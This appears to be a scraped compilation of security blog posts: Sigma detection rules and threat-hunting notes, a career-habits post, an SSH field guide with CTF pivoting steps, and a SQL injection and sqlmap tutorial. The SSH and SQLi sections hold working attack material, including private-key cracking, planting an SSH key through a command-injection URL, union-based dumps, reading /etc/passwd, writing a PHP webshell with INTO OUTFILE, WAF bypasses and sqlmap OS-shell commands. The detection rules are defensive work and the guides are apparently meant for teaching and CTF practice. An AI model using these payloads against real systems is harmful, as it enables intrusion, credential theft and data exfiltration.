level: medium                                       # informational | low | medium | high | critical detection logic — field modifiers sigma's power is in its field modifiers. they translate to native siem query language when compiled. real detection rules — att&ck technique by technique t1059.001 — powershell with encoded commands title: powershell encoded command execution
id: c539afac-c12a-46ed-b1c5-924a97ec9de8
status: stable
description: |
    detects powershell execution with the -encodedcommand flag, which is used
    to pass base64-encoded scripts. while occasionally legitimate (some deployment
    tools use it), the combination with -noninteractive and -windowstyle hidden
    is almost always malicious — it suppresses the console window and disables
    user interaction, characteristic of stager and dropper behaviour.
references:
    - https://attack.mitre.org/techniques/t1059/001/
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
        commandline|windash|contains|all:
            - '-enc'          # -encodedcommand, -enc, -en, -e (powershell accepts prefixes)
            - '-w'
            - 'hidden'        # -windowstyle hidden — suppress console window
    condition: selection
falsepositives:
    - rare: some enterprise deployment tools use encoded commands with hidden windows
    - legitimate citrix/remote desktop software has been observed using this pattern
level: high

# ─────────────────────────────────────────────────────────────────
# why this works: base64-encoded payload + hidden window = attacker
# trying to run code without a visible terminal. the combination is
# the signal — individual flags appear in legit software but combined
# with a hidden window, this is ~95% malicious in practice.
# ───────────────────────────────────────────────────────────────── t1003.001 — lsass memory dump title: lsass memory access by unusual process
id: a0184def-a2b9-40e7-88f5-31a9734b65a3
status: stable
description: |
    detects process access to lsass (local security authority subsystem service)
    memory by processes that are not legitimate security or system processes.
    lsass holds credential material (ntlm hashes, kerberos tickets) in memory.
    access by unusual processes indicates credential dumping — mimikatz,
    procdump, or custom tools reading the lsass process memory space.
references:
    - https://attack.mitre.org/techniques/t1003/001/
tags:
    - attack.credential_access
    - attack.t1003.001
logsource:
    category: process_access          # sysmon event id 10
    product: windows
detection:
    selection:
        targetimage|endswith: '\lsass.exe'
        grantedaccess|contains:       # access rights that allow memory read
            - '0x1010'                # process_vm_read + process_query_information
            - '0x1410'
            - '0x147a'
            - '0x143a'
            - '0x1438'
            - '0x1fffff'              # process_all_access — very suspicious
    filter_legitimate:
        sourceimage|endswith:
            - '\msmpeng.exe'          # windows defender
            - '\svchost.exe'
            - '\csrss.exe'
            - '\wininit.exe'
            - '\wmiprvse.exe'
            - '\taskmgr.exe'          # task manager (legitimate lsass access)
            - '\lsm.exe'
    condition: selection and not filter_legitimate
falsepositives:
    - av and edr products legitimately access lsass — add to filter
    - some forensic/backup tools access process memory
level: critical t1558.003 — kerberoasting title: kerberoasting — service ticket request with rc4 encryption
id: b3ae2f78-d4d7-4e93-a8d4-23b71bd3b7e1
status: stable
description: |
    detects kerberoasting: the technique of requesting kerberos service tickets
    for accounts with spns (service principal names) and cracking them offline.
    the tell is rc4 encryption (etype 0x17 / 23) for the service ticket —
    modern environments use aes (etype 0x11/0x12). an attacker requests rc4
    tickets because they are faster to crack.
    
    key signal: multiple rc4-encrypted tgs requests for different service accounts
    from a single source within a short window (automated enumeration).
references:
    - https://attack.mitre.org/techniques/t1558/003/
    - https://adsecurity.org/?p=2293
tags:
    - attack.credential_access
    - attack.t1558.003
logsource:
    product: windows
    service: security           # windows security event log
detection:
    selection:
        eventid: 4769           # kerberos service ticket operations
        ticketoptions: '0x40810000'
        ticketencryptiontype: '0x17'   # rc4-hmac — the kerberoasting fingerprint
    filter_computer_accounts:
        servicename|endswith: '$'  # machine accounts ending in $, not user accounts
    condition: selection and not filter_computer_accounts
falsepositives:
    - legacy systems (pre-windows 2008) that do not support aes kerberos
    - applications explicitly configured to use rc4 for compatibility
level: high

# ─────────────────────────────────────────────────────────────────
# tuning note: aggregate this rule. one rc4 tgs = possible legacy
# system. five rc4 tgs requests for different accounts within 60
# seconds from the same ip = kerberoasting. use statistical detection
# or temporal aggregation in your siem to raise severity on volume.
# ───────────────────────────────────────────────────────────────── t1021.002 — psexec-style lateral movement title: remote service installation via admin$ share (psexec pattern)
id: f23a2a60-6ef1-4bb2-9b15-8d34e8d7b5d0
status: stable
description: |
    detects the psexec lateral movement pattern: copying a binary to the admin$
    share of a remote host and then creating a service to execute it. this is the
    technique used by psexec (sysinternals), impacket psexec.py, and many c2
    frameworks for lateral movement. key artefacts:
    1. file written to c:\windows\psexesvc.exe (or random name)
    2. service created with that binary path
    3. source is typically a remote smb connection (logon type 3)
references:
    - https://attack.mitre.org/techniques/t1021/002/
tags:
    - attack.lateral_movement
    - attack.t1021.002
logsource:
    product: windows
    service: system
detection:
    selection_service_install:
        eventid: 7045               # new service installed
        servicefilename|contains:
            - 'psexesvc'
            - 'paexec'
    selection_generic_suspicious:
        eventid: 7045
        servicefilename|startswith:
            - 'c:\windows\temp\'
            - 'c:\users\'
            - 'c:\programdata\'
    condition: selection_service_install or selection_generic_suspicious
falsepositives:
    - authorised remote administration using psexec during maintenance
    - sccm and similar management platforms installing services remotely
level: high t1048 — dns exfiltration detection title: potential dns tunneling or exfiltration
id: a7b3c4d5-e6f7-8901-abcd-ef0123456789
status: experimental
description: |
    detects potential dns-based data exfiltration by identifying dns queries
    with anomalously long subdomain labels (>50 characters). legitimate dns
    queries rarely have subdomains longer than 30 characters. attackers use
    dns tunneling tools (iodine, dnscat2, dnsexfiltrator) to encode data
    in subdomain labels of queries to attacker-controlled nameservers.
references:
    - https://attack.mitre.org/techniques/t1048/
    - https://github.com/iagox86/dnscat2
tags:
    - attack.exfiltration
    - attack.t1048
logsource:
    category: dns
detection:
    selection:
        query|re: '([a-za-z0-9]{50,})\.'
    filter_known_long:
        query|endswith:
            - '.in-addr.arpa'
            - '.ip6.arpa'
    filter_cdn:
        query|endswith:
            - '.cloudfront.net'
            - '.azureedge.net'
            - '.akamaiedge.net'
    condition: selection and not 1 of filter_*
falsepositives:
    - some legitimate cdn and cloud services use very long subdomains
    - telemetry and analytics services sometimes encode data in subdomains
    - adjust the 50-character threshold based on your environment baseline
level: medium converting sigma rules to siem queries # install sigma-cli (official converter)
pip3 install sigma-cli
# install backend plugins for your siem
pip3 install pysigma-backend-splunk
pip3 install pysigma-backend-elasticsearch
pip3 install pysigma-backend-qradar
pip3 install pysigma-backend-azure-monitor

# convert a single rule to splunk
sigma convert -t splunk rules/my_rule.yml

# convert with specific pipeline (field name mapping for your siem)
sigma convert -t splunk -p splunk_windows rules/my_rule.yml

# convert entire directory
sigma convert -t splunk -p splunk_windows rules/ -o splunk_queries.txt

# convert to elastic (ecs fields)
sigma convert -t elasticsearch -p ecs_windows rules/ -f ndjson > rules.ndjson

# convert to wazuh (custom wazuh backend)
sigma convert -t wazuh rules/lsass_access.yml

# convert to kql (azure sentinel / microsoft defender)
sigma convert -t kusto -p azure_windows rules/kerberoasting.yml example — splunk query output for the powershell rule # generated by: sigma convert -t splunk -p splunk_windows powershell_enc.yml

index=windows source="xmlwineventlog:microsoft-windows-sysmon/operational" eventcode=1
( image in ("*\\powershell.exe", "*\\pwsh.exe") )
commandline in ("*-enc*", "*-enc*", "*/enc*")
commandline in ("*-w*", "*-w*", "/w*")
commandline in ("*hidden*", "*hidden*", "*hidden*")
| eval risk_score=80, technique="t1059.001"
| table _time, host, user, image, commandline, parentimage, risk_score example — elasticsearch/kibana kql # generated by: sigma convert -t elasticsearch -p ecs_windows powershell_enc.yml

process.executable: (*\powershell.exe or *\pwsh.exe) and
process.command_line: (*-enc* or *-enc* or */enc*) and
process.command_line: (*-w* or */w*) and
process.command_line: (*hidden* or *hidden*) hunting methodology — the hypothesis framework unstructured hunting is random. the hypothesis framework gives each hunt a defined scope, expected output, and success criteria. hunt hypothesis template
─────────────────────────────────────────────────────────────────
hypothesis:
  'an adversary with valid credentials has used winrm/psremoting
   to move laterally between workstations, which would not be
   detected by our current network-based detection'

based on:
  - recent threat intel: apt group targeting finance sector via winrm
  - att&ck t1021.006 not covered in our detection matrix
  - no current alert rule for workstation-to-workstation winrm

data sources required:
  - windows security event log: 4624 (logon), 4103/4104 (powershell)
  - sysmon: network connections from wsmprovhost.exe
  - firewall logs: tcp/5985 (http winrm), tcp/5986 (https winrm)

query strategy:
  1. find all 4624 logon events with logontype=3 (network) from
     source hosts that are workstations (not servers)
  2. correlate with wsmprovhost.exe process creation on target host
  3. flag workstation-to-workstation lateral movement

success criteria (either outcome is success):
  a) found evidence → escalate as incident + write detection rule
  b) no evidence found → document as 'technique not observed in
     this period' + write sigma rule to detect it going forward

time box: 2 hours
───────────────────────────────────────────────────────────────── hunt query — winrm lateral movement # sigma rule written during the hunt — captures the hypothesis as a detection
title: winrm lateral movement between workstations
id: c7b2a1e0-d3f4-5678-90ab-cdef01234567
status: experimental
description: |
    detects winrm/powershell remoting usage between workstations, which is rarely
    legitimate in most environments. legitimate winrm use is typically from
    management servers or jump hosts to workstations/servers — not between peers.
    workstation-to-workstation winrm is a strong indicator of lateral movement.
tags:
    - attack.lateral_movement
    - attack.t1021.006
logsource:
    product: windows
    service: security
detection:
    selection_winrm_network_logon:
        eventid: 4624
        logontype: 3           # network logon
        authenticationpackagename: 'kerberos'
        # processname will be wsmprovhost.exe for winrm sessions on target
    selection_process_on_target:
        eventid: 4688          # process creation
        newprocessname|endswith: '\wsmprovhost.exe'
    filter_servers:
        computername|contains:
            - 'srv-'
            - 'server'
            - 'dc-'
    condition: (selection_winrm_network_logon or selection_process_on_target)
              and not filter_servers
falsepositives:
    - it administrators remoting into workstations for support
    - management tooling configured to use winrm against workstations
level: medium sigma rule quality checklist before merging a detection rule to your production ruleset:

✓ mapped to one or more att&ck technique ids in the `tags` field
✓ `id` field contains a unique uuid (`uuidgen` to generate)
✓ `description` explains why this is suspicious, not just what it matches
✓ false positives documented — every known exception is listed
✓ filter blocks exclude legitimate uses (don't just have selection blocks)
✓ tested against known-good baseline: zero false positives in 24-hour dry run
✓ tested against a known attack: atomic red team test fires the rule
✓ `level` reflects actual risk: most rules should be `medium` — use `critical` sparingly
✓ peer-reviewed by a second analyst before production deployment
✗ do not ship a rule without testing it — untested rules erode trust in your alerting
✗ do not copy rules from the sigmahq community repository without testing them in your environment first — your baseline is different the detection pipeline production detection pipeline

  [threat intel / att&ck]    [red team / purple team]
          │                           │
          └──────────┬────────────────┘
                     ▼
           hunt hypothesis
                     │
                     ▼
           raw log query (siem)        ← baseline the environment first
                     │
             found anomaly?
            ┌────────┴────────┐
           yes               no
            │                 │
            ▼                 ▼
      incident response    write sigma rule
            │              (absence is evidence)
            ▼                 │
     post-incident           ▼
     sigma rule         test in staging
            │                 │
            └────────┬────────┘
                     ▼
             production rule set
                     │
                     ▼
        alert fires → soc triage → escalate
                     │
           monthly: tune false positives
           quarterly: review rule coverage vs att&ck matrix resources you cannot write rules for every att&ck technique simultaneously. prioritise by: (1) techniques in the cisa kev feed — actively exploited right now, (2) techniques in threat reports targeting your sector, (3) techniques you observed in your last red team engagement. twenty well-tuned, low-noise rules covering your actual threat landscape beat two hundred noisy rules nobody investigates.

title: Staying Sharp — How I Keep Security Skills From Going Stale
summary: Personal notes on maintaining breadth across red, blue, and cloud without burning out: the daily reading habit that actually sticks, a lab rotation schedule, CT
body:
staying sharp — how i keep security skills from going stale personal notes on maintaining breadth across red, blue, and cloud without burning out: the daily reading habit that actually sticks, a lab rotation schedule, ctf cadence, and an honest list of what's worth paying for versus what isn't. notes career learning ctf habits the hardest part of security isn't learning a skill — it's keeping three or four unrelated skill sets simultaneously current while the field underneath all of them keeps moving. this is the actual schedule i run, not an aspirational one. the daily reading habit that actually sticks anything requiring more than 15 minutes a day dies within two weeks — that's just true for me, and probably for most people with a full-time job. what survives is a tight, fixed rotation, read in the same order every morning before anything else gets a chance to eat the time slot:

**1. one vendor/cert advisory feed** (cisa kev additions, or a vendor security advisory rss) — five minutes, just enough to know what's actively being exploited this week.

**2. one technical writeup**, rotating weekly between a red-team source (a fresh ctf writeup, a new tool release note) and a blue-team source (a detection engineering post, a dfir case study). alternating the angle deliberately prevents the read-only-what-i-already-do trap.

**3. skim, don't deep-read, everything else.** headlines and abstracts for a broader news aggregator are enough to flag what deserves a real read later — most days, nothing does, and that's fine. what i read each day matters less than reading at a fixed time every day. the habit that survives is the one tied to an existing routine (coffee, commute, first 15 minutes at the desk) — not the one that depends on remembering to do it. lab rotation schedule breadth across red, blue, and cloud doesn't happen by accident — without a forced rotation, time naturally drifts toward whichever skill is most fun *right now*, and the other two atrophy quietly until a job interview or an engagement exposes the gap. the rotation i run, in four-week blocks: week 2 deliberately reuses week 1's output — testing a detection against the exact attack you just ran yourself is far more honest feedback than testing it against a canned dataset. this is the single highest-value link in the whole rotation. ctf cadence i don't play every weekend — that's a fast route to burnout and diminishing returns once you've already internalised the recurring patterns (see the companion notes on that). what i actually do: **one ctf a month, picked deliberately for a category i'm weakest in**, not the category i'd enjoy most. if pwn is rusty, that month's ctf is pwn-heavy, even if web would be more fun. the goal of a monthly ctf isn't points on a leaderboard — it's a forcing function against skill rot in the area i'd otherwise avoid. paid vs. free — an honest list before paying for anything, the question i ask is: does this let me *do* something hands-on that i otherwise couldn't, or does it just deliver the same information in a more polished format? hands-on access (lab compute, vulnerable targets, a real cloud sandbox) consistently clears that bar. content consumption, almost as consistently, doesn't — there's already more free, high-quality technical writing than anyone can read.

title: SSH — Field Guide
summary: Key auth, port forwarding, SCP, SOCKS proxying, and a CTF workflow covering key cracking, pivoting, and writing your own key to a compromised box.
body:
ssh — field guide key auth, port forwarding, scp, socks proxying, and a ctf workflow covering key cracking, pivoting, and writing your own key to a compromised box. tools ssh tunneling pivoting tools network what is ssh ssh (*secure shell*) is the standard protocol for encrypted remote access. it runs on **port 22** by default and replaces old cleartext protocols like telnet and rsh.

beyond remote shells, ssh is a full tunneling toolkit — it handles file transfer, port forwarding, socks proxying, and agent forwarding. in ctfs it's your primary foothold tool; in real-world it's the backbone of every sysadmin workflow. connecting # standard connection
ssh user@10.10.10.5

# non-default port
ssh -p 2222 user@10.10.10.5

# run a single command and exit
ssh user@10.10.10.5 'whoami && id'

# connect with a specific private key
ssh -i ~/.ssh/id_rsa user@10.10.10.5

# connect with verbose output (useful for debugging auth failures)
ssh -v user@10.10.10.5
ssh -vvv user@10.10.10.5  # maximum verbosity

# disable host key checking (ctf/lab use only — mitm risk)
ssh -o stricthostkeychecking=no -o userknownhostsfile=/dev/null user@10.10.10.5 common flags key-based authentication password auth is fine for quick access, but key pairs are the standard for production systems — no password in shell history, no brute-force surface. # generate a key pair (ed25519 is modern and fast)
ssh-keygen -t ed25519 -c 'my-key' -f ~/.ssh/id_ed25519

# rsa 4096 for compatibility with older systems
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa

# copy public key to a remote server
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@10.10.10.5

# manual method (if ssh-copy-id is not available)
cat ~/.ssh/id_ed25519.pub | ssh user@10.10.10.5 \
  'mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'

# fix permissions if ssh refuses your key
chmod 700 ~/.ssh
chmod 600 ~/.ssh/id_ed25519
chmod 644 ~/.ssh/id_ed25519.pub if you find an `id_rsa` file on a compromised machine, copy it locally and use it:

```bash
chmod 600 id_rsa
ssh -i id_rsa user@10.10.10.5
```

if the key is **password-protected**, crack it with `ssh2john` + `john`:

```bash
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
``` ssh config file `~/.ssh/config` saves connection parameters so you never type long flags again. each `host` block defines an alias. host htb
    hostname 10.10.10.5
    user root
    identityfile ~/.ssh/id_rsa
    port 22
    stricthostkeychecking no
    userknownhostsfile /dev/null

host prod
    hostname myserver.com
    user deploy
    identityfile ~/.ssh/deploy_key
    port 2222

host bastion
    hostname bastion.internal
    user admin
    identityfile ~/.ssh/bastion_key

host internal
    hostname 192.168.10.5
    user root
    proxyjump bastion   # routes through the bastion host

# connect with just: ssh htb port forwarding port forwarding is one of ssh's most powerful features — it tunnels traffic through the encrypted ssh connection, bypassing firewalls and reaching internal services. **local forwarding** (`-l`) — makes a remote port reachable on your local machine: ssh -l [local_port]:[remote_host]:[remote_port] user@ssh_host # access a web app on the remote server's localhost:8080 via your local port 8080
ssh -l 8080:localhost:8080 user@10.10.10.5
# now browse: http://localhost:8080

# access an internal database only reachable from the ssh server
ssh -l 3306:10.10.10.20:3306 user@10.10.10.5
# now: mysql -h 127.0.0.1 -p 3306

# background it (no shell, just the tunnel)
ssh -fn -l 8080:localhost:8080 user@10.10.10.5 **remote forwarding** (`-r`) — exposes your local port on the remote server. used to receive reverse shells through nat: # expose your local port 4444 as port 4444 on the remote server
ssh -r 4444:localhost:4444 user@10.10.10.5
# on the remote machine, a process connecting to localhost:4444
# will reach your local listener

# useful for receiving a reverse shell from a box you can't reach directly
ssh -fn -r 9001:localhost:9001 user@pivot-host **dynamic forwarding** (`-d`) — creates a local socks proxy. route all traffic through the ssh server: # start socks5 proxy on local port 1080
ssh -fn -d 1080 user@10.10.10.5

# use with proxychains — add to /etc/proxychains.conf:
# socks5 127.0.0.1 1080
proxychains nmap -st -pn 192.168.1.0/24
proxychains curl http://192.168.1.10/

# use with curl directly
curl --socks5 127.0.0.1:1080 http://192.168.1.10/ file transfer — scp & sftp # download a file from remote to local
scp user@10.10.10.5:/etc/passwd ./passwd

# upload a file to remote
scp shell.php user@10.10.10.5:/var/www/html/

# recursive directory copy
scp -r user@10.10.10.5:/home/user/data/ ./data/

# non-standard port
scp -p 2222 user@10.10.10.5:/flag.txt ./

# with a specific key
scp -i ~/.ssh/id_rsa user@10.10.10.5:/root/root.txt ./ sftp user@10.10.10.5

sftp> ls -la
sftp> get /etc/shadow
sftp> put linpeas.sh /tmp/
sftp> bye real-world use cases **jump host / bastion** — access an internal server through a dmz host: # single hop
ssh -j bastion.corp.com user@192.168.10.5

# multiple hops
ssh -j hop1,hop2 user@final-target

# or define it in ~/.ssh/config (cleaner)
# host internal
#     proxyjump bastion **persistent reverse tunnel** — keep a remote machine reachable even when it's behind nat: # install autossh on the remote machine
sudo apt install autossh

# keep a reverse tunnel alive — exposes remote's port 22 on your server's port 2222
autossh -m 0 -fn \
  -o 'serveraliveinterval 30' \
  -o 'exitonforwardfailure yes' \
  -r 2222:localhost:22 user@your-vps.com

# now ssh into the remote machine from your vps:
ssh -p 2222 remote-user@localhost **ssh escape sequences** — control a hung session without closing the terminal: # press enter, then ~ to access the escape menu:
~.    # kill a frozen ssh connection
~c    # open ssh command prompt (add port forwards mid-session)
~#    # list forwarded connections
~?    # show all escape sequences

# example: add a local forward to a running session
# press enter, ~c, then:
-l 8080:localhost:80 ctf & hackthebox workflow ssh on a ctf box is usually the end goal of initial access — a stable shell beats a netcat reverse shell every time. port forwarding is essential for reaching internal services. export ip=10.10.10.5

# 1. check what auth methods the server accepts
nmap --script ssh-auth-methods -p 22 $ip

# 2. try default/common credentials
ssh root@$ip
ssh admin@$ip

# 3. if you have a key file from the box
chmod 600 id_rsa
ssh -i id_rsa user@$ip

# 4. crack a password-protected key
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

# 5. enumerate users (older openssh versions)
nmap --script ssh-enum-algos,ssh2-enum-algos -p 22 $ip # you have ssh on the box and see internal services in netstat
# e.g. a web app on 127.0.0.1:8080 and a db on 127.0.0.1:3306

# forward both to your machine
ssh -fn \
  -l 8080:127.0.0.1:8080 \
  -l 3306:127.0.0.1:3306 \
  user@$ip

# now access them locally
curl http://localhost:8080
mysql -h 127.0.0.1 -p 3306 -u root

# reach a whole internal subnet via socks proxy
ssh -fn -d 1080 user@$ip
proxychains nmap -st -pn -p 80,443,8080 10.10.10.0/24 # if you have rce (e.g. command injection, web shell) and .ssh is writable:
# 1. generate a key pair on your machine
ssh-keygen -t ed25519 -f /tmp/htb_key -n ''

# 2. inject your public key via the rce
curl 'http://10.10.10.5/exec?cmd=mkdir+-p+/root/.ssh'
curl 'http://10.10.10.5/exec?cmd=echo+ssh_pubkey+>>+/root/.ssh/authorized_keys'

# 3. ssh in cleanly
ssh -i /tmp/htb_key root@$ip **`-fn`** backgrounds the connection and runs no command — perfect for pure tunnels.  
**`-vvv`** shows exactly why auth is failing — check it before assuming the key is wrong.  
**`~.`** (enter then `~.`) kills a frozen session cleanly.  
**`chmod 600 id_rsa`** — ssh silently refuses keys with open permissions.  
**`ssh2john` + `john`** — standard workflow for cracking passphrase-protected keys.  
**proxyjump / `-j`** is cleaner than chaining multiple `ssh` commands for multi-hop pivoting.

title: SQL Injection & sqlmap – From Manual Payloads to Full Dumps
summary: SQL injection is one of the most impactful web vulnerabilities. Learn manual detection and exploitation techniques, then automate the heavy lifting with sqlmap
body:
sql injection & sqlmap – from manual payloads to full dumps sql injection is one of the most impactful web vulnerabilities. learn manual detection and exploitation techniques, then automate the heavy lifting with sqlmap — from basic dumps to os shell access. tools sql sqli sqlmap web pentesting what is sql injection? **sql injection (sqli)** occurs when user-supplied input is inserted into a sql query without proper sanitisation. an attacker can alter the query logic to bypass authentication, extract data, write files, or execute os commands. detection – finding the injection point start simple — break the query, then confirm control. -- single quote: causes a db error if vulnerable
'

-- comment out the rest of the query
' --
' -- -
'#         (mysql)

-- always-true condition: returns all rows
' or '1'='1
' or 1=1 --
1' or '1'='1' --

-- always-false: returns zero rows (page differs from always-true)
' and '1'='2

-- arithmetic check: if 1+1=2 response equals normal, injection exists
1+1         → compare with 2 response

-- time-based blind confirmation
' and sleep(5) --          (mysql)
'; waitfor delay '0:0:5'-- (mssql)
' and pg_sleep(5) --       (postgresql) manual union-based injection union injection appends a second `select` to the original query and returns data in the normal response. you need to know the **number of columns** and **data types** first. -- step 1: find column count with order by
' order by 1 --
' order by 2 --
' order by 3 --    ← error here means 2 columns

-- alternative: null probing
' union select null --
' union select null,null --
' union select null,null,null --

-- step 2: find which column is visible in the page
' union select 'a',null,null --
' union select null,'a',null --
' union select null,null,'a' --

-- step 3: extract data (mysql example, 3 columns, col 2 is visible)
' union select null,database(),null --           -- current db name
' union select null,user(),null --               -- current db user
' union select null,@@version,null --            -- db version

-- step 4: list all databases
' union select null,schema_name,null from information_schema.schemata --

-- step 5: list tables in a database
' union select null,table_name,null from information_schema.tables where table_schema='target_db' --

-- step 6: list columns in a table
' union select null,column_name,null from information_schema.columns where table_name='users' --

-- step 7: dump the data
' union select null,concat(username,':',password),null from users -- boolean blind injection no data in the response — only a difference between **true** and **false** (content changes, element appears/disappears, redirect vs no redirect). -- confirm: true vs false gives different page
' and 1=1 --    ← normal page
' and 1=2 --    ← different / empty page

-- extract db name character by character
' and substring(database(),1,1)='a' --
' and substring(database(),1,1)='b' --
-- ... until page returns true

-- binary search with ascii (faster)
' and ascii(substring(database(),1,1)) > 109 --
' and ascii(substring(database(),1,1)) > 115 --
-- narrows to exact char in ~7 requests per character file read / write (mysql) -- read a file (requires file privilege)
' union select null,load_file('/etc/passwd'),null --
' union select null,load_file('/var/www/html/config.php'),null --

-- write a webshell (requires write permission on web root)
' union select null,'<?php system($_get["cmd"]); ?>',null
  into outfile '/var/www/html/shell.php' --

-- then access:
-- http://target.com/shell.php?cmd=id common bypasses -- waf / filter bypasses
select          -- mixed case (some filters are case-sensitive)
sel/**/ect      -- inline comments to break keywords
select%09       -- tab instead of space (%09)
/*!select*/     -- mysql version comment

-- quote bypass with hex encoding
-- instead of: where username='admin'
-- use:        where username=0x61646d696e

-- space bypass
select/**/username/**/from/**/users

-- double encoding
%2527  →  %27  →  '

-- second-order injection: stored then re-used
-- register username: admin'--
-- used later in: select * from users where username='admin'--' sqlmap – automated sqli `sqlmap` automates detection and exploitation across all injection types and databases. it handles enumeration, dumping, and even os-level access. sqlmap – basic usage # test a url parameter
sqlmap -u 'http://target.com/item?id=1'

# specify the parameter explicitly
sqlmap -u 'http://target.com/item?id=1&cat=2' -p id

# post request
sqlmap -u 'http://target.com/login' --data='user=admin&pass=test'

# load request from burp/file (most reliable for complex requests)
sqlmap -r request.txt

# https
sqlmap -u 'https://target.com/item?id=1' --batch sqlmap – authentication & sessions # cookie-based session (authenticated scan)
sqlmap -u 'http://target.com/profile?id=1' --cookie='phpsessid=abc123; session=xyz'

# http basic auth
sqlmap -u 'http://target.com/admin?id=1' --auth-type=basic --auth-cred='admin:password'

# custom header injection (e.g. x-forwarded-for)
sqlmap -u 'http://target.com/' --header='x-forwarded-for: 1*'

# user agent injection
sqlmap -u 'http://target.com/' --user-agent='mozilla* '

# follow redirects
sqlmap -u 'http://target.com/item?id=1' --follow-redirects sqlmap – enumeration flags # get current database name
sqlmap -u 'http://target.com/item?id=1' --current-db

# get current user
sqlmap -u 'http://target.com/item?id=1' --current-user

# check if user is dba
sqlmap -u 'http://target.com/item?id=1' --is-dba

# list all databases
sqlmap -u 'http://target.com/item?id=1' --dbs

# list tables in a database
sqlmap -u 'http://target.com/item?id=1' -d target_db --tables

# list columns in a table
sqlmap -u 'http://target.com/item?id=1' -d target_db -t users --columns

# dump a table
sqlmap -u 'http://target.com/item?id=1' -d target_db -t users --dump

# dump specific columns
sqlmap -u 'http://target.com/item?id=1' -d target_db -t users -c username,password --dump

# dump everything (slow on large dbs)
sqlmap -u 'http://target.com/item?id=1' --dump-all sqlmap – tuning & speed # risk and level (1-5 each; higher = more aggressive/dangerous tests)
sqlmap -u 'http://target.com/item?id=1' --level=3 --risk=2

# force specific db type (skip detection)
sqlmap -u 'http://target.com/item?id=1' --dbms=mysql
sqlmap -u 'http://target.com/item?id=1' --dbms=mssql
sqlmap -u 'http://target.com/item?id=1' --dbms=postgresql

# force injection technique
sqlmap -u 'http://target.com/item?id=1' --technique=u    # union only
sqlmap -u 'http://target.com/item?id=1' --technique=bt   # boolean + time-based
sqlmap -u 'http://target.com/item?id=1' --technique=beustq  # all

# set number of threads
sqlmap -u 'http://target.com/item?id=1' --threads=5

# skip confirmation prompts (use defaults)
sqlmap -u 'http://target.com/item?id=1' --batch

# use a proxy (e.g. burp)
sqlmap -u 'http://target.com/item?id=1' --proxy='http://127.0.0.1:8080' sqlmap – waf bypass # use a tamper script
sqlmap -u 'http://target.com/item?id=1' --tamper=space2comment
sqlmap -u 'http://target.com/item?id=1' --tamper=randomcase
sqlmap -u 'http://target.com/item?id=1' --tamper=between,randomcase,space2comment

# common tamper scripts:
# space2comment    -- spaces → /**/ 
# randomcase       -- select random case
# between          -- > → not between 0 and
# charencode       -- url encode chars
# base64encode     -- base64 encode payload
# equaltolike      -- = → like
# modsecurityversioned -- version comments for mysql

# list all available tampers
sqlmap --list-tampers

# random user agent to avoid signature detection
sqlmap -u 'http://target.com/item?id=1' --random-agent

# add delay between requests
sqlmap -u 'http://target.com/item?id=1' --delay=1 sqlmap – os & shell access # read a file from the server
sqlmap -u 'http://target.com/item?id=1' --file-read='/etc/passwd'
sqlmap -u 'http://target.com/item?id=1' --file-read='c:/windows/win.ini'

# write a file to the server
sqlmap -u 'http://target.com/item?id=1' \
  --file-write='./shell.php' --file-dest='/var/www/html/shell.php'

# interactive os shell (via into outfile webshell or xp_cmdshell)
sqlmap -u 'http://target.com/item?id=1' --os-shell

# interactive sql shell
sqlmap -u 'http://target.com/item?id=1' --sql-shell

# enable xp_cmdshell on mssql
sqlmap -u 'http://target.com/item?id=1' --os-pwn   # meterpreter / vnc using a burp request file the most reliable way to use sqlmap on complex requests (with tokens, custom headers, json bodies) is to capture the request in burp and save it. # request.txt (copied from burp "copy to file" or "save item")
# get /item?id=1 http/1.1
# host: target.com
# cookie: session=abc123
# ...

sqlmap -r request.txt --batch --level=3

# mark the injection point explicitly with *
# get /item?id=1* http/1.1
sqlmap -r request.txt -p id

# for json bodies, sqlmap auto-detects -- or mark with *
# {"id": "1*"} real-world use cases **bug bounty / web application testing**
- test every user-controlled input: get/post parameters, cookies, http headers (`user-agent`, `x-forwarded-for`, `referer`), json/xml bodies
- after confirming sqli, use `--current-user --is-dba` to assess impact before going further
- `--file-read` on config files (`config.php`, `web.config`, `.env`) often yields db credentials, api keys, or secrets
- always scan with `--batch` and save a full log with `--output-dir` for report evidence **penetration testing**
- mssql with dba rights: `--os-shell` via `xp_cmdshell` gives direct command execution
- mysql: `load_file` + `into outfile` for reading configs and dropping webshells
- credential harvesting: dump `users` tables and crack hashes offline with hashcat
- pivot: leaked db credentials frequently reused on ssh, admin panels, vpns ctf / htb workflow # step 1: quick manual check -- does ' cause an error?
curl -s 'http://<target>/item?id=1'
curl -s "http://<target>/item?id=1'"

# step 2: confirm with sqlmap
sqlmap -u 'http://<target>/item?id=1' --batch --level=2

# step 3: enumerate
sqlmap -u 'http://<target>/item?id=1' --batch --current-db --dbs

# step 4: dump users table
sqlmap -u 'http://<target>/item?id=1' --batch \
  -d <dbname> -t users --dump

# step 5: if hashes found -- crack them
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt    # md5
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt # bcrypt

# step 6: check for file read (common flag location)
sqlmap -u 'http://<target>/item?id=1' --batch \
  --file-read='/var/www/html/config.php'

# step 7: if dba and mysql -- try webshell
sqlmap -u 'http://<target>/item?id=1' --batch --os-shell - check cookies, `user-agent`, `referer`, and `x-forwarded-for` headers — blind sqli in headers is a common htb trick
- login forms: try `admin' -- -` as username with any password to bypass authentication manually
- if `--dump` is slow, use `--where` to limit rows: `--where="username='admin'"`
- second-order injection: register a malicious username, trigger it on a profile/settings page
- look for `flag` or `secret` tables: `sqlmap ... --tables` then grep output for juicy names
- union payloads blocked? try `--technique=t` (time-based blind) — slower but works around many filters quick reference **manual detection checklist:** `'`  →  `' or 1=1 --`  →  `' and sleep(5) --`

**sqlmap core flags:**
- `-u` url | `-r` request file | `-p` parameter | `--data` post body
- `--cookie` session | `--header` custom header | `--random-agent`
- `--dbs` list dbs | `-d` select db | `--tables` | `-t` select table
